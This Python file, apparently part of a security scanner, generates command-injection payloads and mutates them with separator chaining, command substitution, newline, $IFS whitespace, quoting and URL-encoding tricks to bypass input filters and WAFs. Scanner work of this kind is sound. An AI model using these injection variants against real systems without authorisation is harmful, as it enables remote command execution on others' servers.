"""Command-injection payload generation and shell-metacharacter mutation."""
from __future__ import annotations

import urllib.parse
from typing import Any, Dict, List, Optional

from argus.collectors.command_injection.models import (
    RESULT_COMMAND_PAYLOADS,
    DEFAULT_TIME_DELAY_PAYLOADS,
    DEFAULT_ERROR_TRIGGER_PAYLOADS,
)


class CommandInjectionPayloadGenerator:
    """
    Generates base command injection payloads and applies 8 distinct separator &
    WAF bypass mutation strategies for result-based, time-based blind, and error-based detection.
    """

    def __init__(
        self,
        custom_result_payloads: Optional[List[Dict[str, Any]]] = None,
        custom_time_payloads: Optional[List[Dict[str, Any]]] = None,
        custom_error_payloads: Optional[List[str]] = None,
    ):
        self.custom_result_payloads = list(custom_result_payloads) if custom_result_payloads is not None else None
        self.custom_time_payloads = list(custom_time_payloads) if custom_time_payloads is not None else None
        self.custom_error_payloads = list(custom_error_payloads) if custom_error_payloads is not None else None

    # --- Base Payload Accessors ---

    def generate_result_payloads(self) -> List[Dict[str, Any]]:
        """Returns base result-based command payloads."""
        if self.custom_result_payloads is not None:
            return list(self.custom_result_payloads)
        return list(RESULT_COMMAND_PAYLOADS)

    def generate_time_payloads(self, delay: int = 5) -> List[Dict[str, Any]]:
        """Returns time-delay payload definitions configured with delay in seconds."""
        templates = self.custom_time_payloads if self.custom_time_payloads is not None else DEFAULT_TIME_DELAY_PAYLOADS
        payloads = []
        for entry in templates:
            tmpl = entry["template"]
            os_type = entry.get("os", "generic")
            payloads.append({
                "cmd": tmpl.format(delay=delay),
                "os": os_type,
                "delay": delay,
            })
        return payloads

    def generate_error_payloads(self) -> List[str]:
        """Returns base error-trigger payloads."""
        if self.custom_error_payloads is not None:
            return list(self.custom_error_payloads)
        return list(DEFAULT_ERROR_TRIGGER_PAYLOADS)

    # --- 8 Distinct Separator & Bypass Mutation Strategies ---

    def mutate_semicolons(self, cmd: str) -> List[str]:
        """
        Strategy 1: Semicolon Chaining.
        Sequential execution using semicolons.
        """
        return [
            f"; {cmd}",
            f"; {cmd} ;",
            f" ; {cmd}",
            f";; {cmd}",
            f"1; {cmd}",
            f"1; {cmd};",
        ]

    def mutate_pipes(self, cmd: str) -> List[str]:
        """
        Strategy 2: Pipe Chaining.
        Pipe and conditional OR execution.
        """
        return [
            f"| {cmd}",
            f"|| {cmd}",
            f" | {cmd} |",
            f" || {cmd} ||",
            f"1 | {cmd}",
            f"1 || {cmd}",
        ]

    def mutate_ampersands(self, cmd: str) -> List[str]:
        """
        Strategy 3: Ampersand Chaining.
        Background and conditional AND execution.
        """
        return [
            f"& {cmd}",
            f"&& {cmd}",
            f" & {cmd} &",
            f" && {cmd} &&",
            f"1 & {cmd}",
            f"1 && {cmd}",
        ]

    def mutate_substitution(self, cmd: str) -> List[str]:
        """
        Strategy 4: Command Substitution.
        Subshell evaluation via backticks and dollar-parens.
        """
        return [
            f"`{cmd}`",
            f"$({cmd})",
            f"`echo {cmd} | sh`",
            f"$(echo {cmd} | sh)",
            f"\"`{cmd}`\"",
            f"\"$({cmd})\"",
        ]

    def mutate_newlines(self, cmd: str) -> List[str]:
        """
        Strategy 5: Newline Separators.
        Line-break command separators (raw and URL-encoded).
        """
        return [
            f"\n{cmd}",
            f"\r\n{cmd}",
            f"%0a{cmd}",
            f"%0d%0a{cmd}",
            f"\n{cmd}\n",
            f"%0a{cmd}%0a",
        ]

    def mutate_url_encoding(self, payload: str) -> List[str]:
        """
        Strategy 6: URL / Double URL Encoding.
        Percent-encoding separator characters to bypass basic input filters.
        """
        single_enc = urllib.parse.quote(payload, safe="")
        double_enc = urllib.parse.quote(single_enc, safe="")
        return [single_enc, double_enc]

    def mutate_whitespace(self, cmd: str) -> List[str]:
        """
        Strategy 7: Whitespace Substitutions.
        Replacing spaces using $IFS, ${IFS}, $IFS$9, %09 (tab), or +.
        """
        if " " not in cmd:
            return [cmd]
        return [
            cmd.replace(" ", "${IFS}"),
            cmd.replace(" ", "$IFS$9"),
            cmd.replace(" ", "%09"),
            cmd.replace(" ", "+"),
        ]

    def mutate_inline_quotes(self, cmd: str) -> List[str]:
        """
        Strategy 8: Inline Quote Obfuscation.
        Inserts single/double quotes or backslashes into the command token.
        """
        parts = cmd.split(" ", 1)
        base = parts[0]
        rest = (" " + parts[1]) if len(parts) > 1 else ""

        single_q = "".join(f"'{c}'" if c.isalpha() else c for c in base) + rest
        double_q = "".join(f'"{c}"' if c.isalpha() else c for c in base) + rest
        backslash = "".join(f"\\{c}" if c.isalpha() and i % 2 == 1 else c for i, c in enumerate(base)) + rest
        return [single_q, double_q, backslash]

    def generate_mutated_payloads(self, base_cmd: str) -> List[str]:
        """
        Generates a comprehensive, deduplicated list of mutated payloads for a given base command
        using all separator, substitution, newline, whitespace, quote, and encoding strategies.
        """
        variants: List[str] = [base_cmd]

        # 1. Separator mutations
        for fn in [
            self.mutate_semicolons,
            self.mutate_pipes,
            self.mutate_ampersands,
            self.mutate_substitution,
            self.mutate_newlines,
        ]:
            variants.extend(fn(base_cmd))

        # 2. Whitespace variations for multi-word commands
        ws_variants = []
        for v in list(variants):
            if " " in v:
                ws_variants.extend(self.mutate_whitespace(v))
        variants.extend(ws_variants)

        # 3. Quote obfuscation for single-word command bases
        quote_variants = []
        for q_cmd in self.mutate_inline_quotes(base_cmd):
            if q_cmd != base_cmd:
                quote_variants.append(f"; {q_cmd}")
                quote_variants.append(f"| {q_cmd}")
                quote_variants.append(f"& {q_cmd}")
                quote_variants.append(f"$({q_cmd})")
                quote_variants.append(f"%0a{q_cmd}")
        variants.extend(quote_variants)

        # 4. URL encoding variations for top separators
        url_enc_variants = []
        for v in variants[:15]:
            url_enc_variants.extend(self.mutate_url_encoding(v))
        variants.extend(url_enc_variants)

        # Deduplicate preserving order
        seen = set()
        unique_variants: List[str] = []
        for item in variants:
            if item and item not in seen:
                seen.add(item)
                unique_variants.append(item)

        return unique_variants


# =============================================================================
# Command Injection Analyzer
# =============================================================================

